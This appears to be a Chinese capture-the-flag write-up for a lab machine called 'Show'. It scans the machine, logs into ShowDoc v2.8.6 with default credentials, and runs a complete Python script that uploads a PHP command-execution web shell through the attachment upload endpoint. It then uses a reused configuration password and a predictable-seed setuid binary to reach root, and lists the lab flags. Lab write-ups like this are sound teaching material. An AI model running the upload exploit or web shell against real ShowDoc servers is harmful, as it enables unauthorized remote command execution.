---
title: Show
date: 2026-04-27T13:22:08+08:00
lastmod: 2026-04-27T14:57:18+08:00
---
# 信息收集

```
nmap -p-  192.168.100.25
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-27 01:50 EDT
Nmap scan report for 192.168.100.25
Host is up (0.0016s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:2A:BC:9D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 12.19 seconds
```

# 目标信息

```
目标 IP：192.168.100.25
Web 服务：Apache + ShowDoc
识别版本：ShowDoc v2.8.6
```

# Web 初始落点

直接使用 ShowDoc 默认管理员口令登录

```
showdoc / 123456
```

登录后台后，利用附件上传点获取 WebShell。

```
#!/usr/bin/env python3
import json
import os
import sys
from pathlib import Path

import requests

# Only change this IP.
TARGET_IP = "192.168.100.25"

USERNAME = "showdoc"
PASSWORD = "123456"
ITEM_ID = 1
PAGE_TITLE = "upload-poc"
PAGE_CONTENT = "upload-poc"
REMOTE_NAME = "cmd.phar"
PAYLOAD = '<?php system($_GET["cmd"]); ?>'

def build_base(ip: str) -> str:
    return f"http://{ip}/server/index.php?s="

def login(session: requests.Session, base: str) -> None:
    resp = session.post(
        f"{base}/api/user/login",
        data={"username": USERNAME, "password": PASSWORD},
        timeout=15,
    )
    resp.raise_for_status()
    data = resp.json()
    if data.get("error_code") != 0:
        raise RuntimeError(f"login failed: {data}")

def create_page(session: requests.Session, base: str) -> int:
    resp = session.post(
        f"{base}/api/page/save",
        data={
            "page_id": 0,
            "item_id": ITEM_ID,
            "page_title": PAGE_TITLE,
            "page_content": PAGE_CONTENT,
            "is_urlencode": 0,
            "cat_id": 0,
        },
        timeout=15,
    )
    resp.raise_for_status()
    data = resp.json()
    if data.get("error_code") != 0:
        raise RuntimeError(f"create page failed: {data}")
    return int(data["data"]["page_id"])

def write_payload_file() -> str:
    payload_path = Path(__file__).with_name(REMOTE_NAME)
    payload_path.write_text(PAYLOAD, encoding="utf-8")
    return str(payload_path)

def upload_file(session: requests.Session, base: str, page_id: int, local_path: str) -> str:
    with open(local_path, "rb") as fh:
        resp = session.post(
            f"{base}/api/page/upload",
            data={"page_id": str(page_id), "item_id": str(ITEM_ID)},
            files={"file": (REMOTE_NAME, fh, "application/octet-stream")},
            timeout=30,
        )
    resp.raise_for_status()
    data = resp.json()
    if data.get("success") != 1:
        raise RuntimeError(f"upload failed: {data}")
    return data["url"]

def resolve_real_url(session: requests.Session, signed_url: str) -> str:
    resp = session.get(signed_url, allow_redirects=False, timeout=15)
    if resp.status_code not in (301, 302, 303, 307, 308):
        raise RuntimeError(
            f"unexpected response while resolving real url: {resp.status_code} {resp.text[:200]!r}"
        )
    location = resp.headers.get("Location")
    if not location:
        raise RuntimeError("missing redirect location")
    return location

def main() -> int:
    session = requests.Session()
    session.verify = False
    session.headers.update({"User-Agent": "showdoc-upload-poc/1.0"})
    requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]

    base = build_base(TARGET_IP)

    try:
        payload_path = write_payload_file()
        login(session, base)
        page_id = create_page(session, base)
        signed_url = upload_file(session, base, page_id, payload_path)
        real_url = resolve_real_url(session, signed_url)

        result = {
            "target": f"http://{TARGET_IP}",
            "item_id": ITEM_ID,
            "page_id": page_id,
            "local_payload": payload_path,
            "signed_url": signed_url,
            "real_url": real_url,
            "example": f"{real_url}?cmd=id",
        }
        print(json.dumps(result, ensure_ascii=False, indent=2))
        return 0
    except Exception as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1

if __name__ == "__main__":
    raise SystemExit(main())
```

```
{
  "target": "http://192.168.100.25",
  "item_id": 1,
  "page_id": 24,
  "local_payload": "C:\\Users\\周\\Downloads\\Show.ova\\cmd.phar",
  "signed_url": "http://192.168.100.25/server/index.php?s=/api/attachment/visitFile/sign/1b4f1d8271303f5202c55616febe5e99",
  "real_url": "http://192.168.100.25/server/../Public/Uploads/2026-04-27/69eef4d96fc99.phar",
  "example": "http://192.168.100.25/server/../Public/Uploads/2026-04-27/69eef4d96fc99.phar?cmd=id"
}
```

# 普通用户密码

找了半天 最后在网站配置文件下找到密码

```
<?php
return array(
    //'配置项'=>'配置值'
    //使用sqlite数据库
    'DB_TYPE'   => 'Sqlite', 
    'DB_NAME'   => '../Sqlite/showdoc.db.php', 
    //showdoc不再支持mysql http://www.showdoc.cc/help?page_id=31990
    'DB_HOST'   => 'localhost',
    'DB_USER'   => 'showdoc', 
    'DB_PWD'    => 'showdoc123456',
    'DB_PORT'   => 3306, // 端口
    'DB_PREFIX' => '', // 数据库表前缀
    'DB_CHARSET'=> 'utf8', // 字符集
    'DB_DEBUG'  =>  TRUE, // 数据库调试模式 开启后可以记录SQL日志
    'URL_HTML_SUFFIX' => '',//url伪静态后缀
    'URL_MODEL' => 3 ,//URL兼容模式
    'URL_ROUTER_ON'   => true, 
    'URL_ROUTE_RULES'=>array(
        ':id\d'               => 'Home/Item/show?item_id=:1',
        ':domain\s$'               => 'Home/Item/show?item_domain=:1',//item的个性域名
        'uid/:id\d'               => 'Home/Item/showByUid?uid=:1',
        'page/:id\d'               => 'Home/Page/single?page_id=:1',
    ),
    'URL_CASE_INSENSITIVE'=>true,
    'SHOW_ERROR_MSG'        =>  true,    // 显示错误信息，这样在部署模式下也能显示错误
    'STATS_CODE' =>'',  //可选，统计代码
    'TMPL_CACHE_ON' => false,//禁止模板编译缓存
    'HTML_CACHE_ON' => false,//禁止静态缓存
    'TMPL_EXCEPTION_FILE' => '../Public/exception.tpl' , //错误模版
    //上传文件到七牛的配置
    'UPLOAD_SITEIMG_QINIU' => array(
                    'maxSize' => 5 * 1024 * 1024,//文件大小
                    'rootPath' => './',
                    'saveName' => array ('uniqid', ''),
                    'driver' => 'Qiniu',
                    'driverConfig' => array (
                            'secrectKey' => '', 
                            'accessKey' => '',
                            'domain' => '',
                            'bucket' => '', 
                        )
                    ),
```

发现密码复用

```
showdoc123456
```

# user.txt

```
mooi@Show:/home$ ls -la  /home/mooi/user.txt
-rw-r--r-- 1 root root 44 Apr 25 20:09 /home/mooi/user.txt
mooi@Show:/home$ cat mooi/user.txt 
flag{user-f5ce64ad520f46e2bcb1dc94dbb6dbd3}
```

# l1qin9

发现可疑程序

```
l1qin9@Show:~$ ls -la auth_monitor 
-rwsr-sr-x 1 root root 16632 Apr 25 22:43 auth_monitor
```

使用 strings 查看程序：

```
--- MAZE-SEC ACCESS MONITOR --- CHALLENGE_STAMP: %08x ENTER ACCESS CODE: /root/show.txt ACCESS DENIED.
```

程序要求输入一个访问码

# 逆向 auth_monitor

使用 objdump / nm 分析程序逻辑后，发现其随机种子函数存在实现错误。

关键函数逻辑等价于：

```
int s0rand(int x){
    int seed = 0x539;   // 1337
    srand(seed);
}
```

也就是说：

虽然程序表面生成了动态 CHALLENGE_STAMP

```
import ctypes
libc = ctypes.CDLL('libc.so.6')
libc.srand(1337)
print(libc.rand())

输出 292616681
```

## 读取 Root/show.txt

![image](assets/image-20260427145632-ebyyg54.png)

```
1NOjcN9b9uqUJ0VPYbgi
```

# root

登录得到flag

```
flag{root-64f26bcf00751fcbe2d03d5a7d7c93ef}
```
